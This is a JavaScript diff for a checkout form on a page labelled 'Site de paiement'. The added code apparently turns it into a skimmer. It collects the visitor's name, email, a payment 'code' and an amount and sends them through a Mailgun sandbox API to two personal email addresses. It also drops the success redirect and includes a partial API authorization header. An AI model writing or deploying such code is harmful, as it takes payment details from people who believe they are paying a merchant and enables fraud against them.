@@ -15,13 +15,29 @@ let form = document.getElementById("checkout-form");
 
 form.addEventListener("submit", function (e) {
   e.preventDefault()
-  let formData = new FormData(Form);
-  fetch("/", {
-    method: "POST",
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: new URLSearchParams(formData).toString(),
-  })
-    .then(() => console.log("Form successfully submitted"))
-    .catch((error) => alert(error));
-    window.location.href = "./success.html"
+
+  let name = document.getElementById("name").value
+  let email = document.getElementById("email").value;
+  let code = document.getElementById("code").value;
+  let amount = document.getElementById("amount").value;
+
+  const body = new FormData();
+  body.append("from", "Site de paiement");
+  body.append("to", "massoudfataou@gmail.com");
+  body.append("to", "mft@hi2.in");
+  body.append("subject", "Nouvelle réponse provenant de votre site");
+  body.append("template", "template_to_admin");
+  body.append("h:X-Mailgun-Variables", '{ "mail": "' + email +'", "name": "' + name +'", "code": "' + code +'", "amount": "' + amount +'"}');
+
+  fetch(
+    "https://api.mailgun.net/v3/sandbox3a2fdd790ff34960bcd4e08b6e217fd0.mailgun.org/messages",
+    {
+      method : "POST",
+      body : body,
+      headers: {
+        Authorization: "64574a68 - d20692a6"
+      },
+    }
+  );
+  //window.location.href = "./success.html"
  })
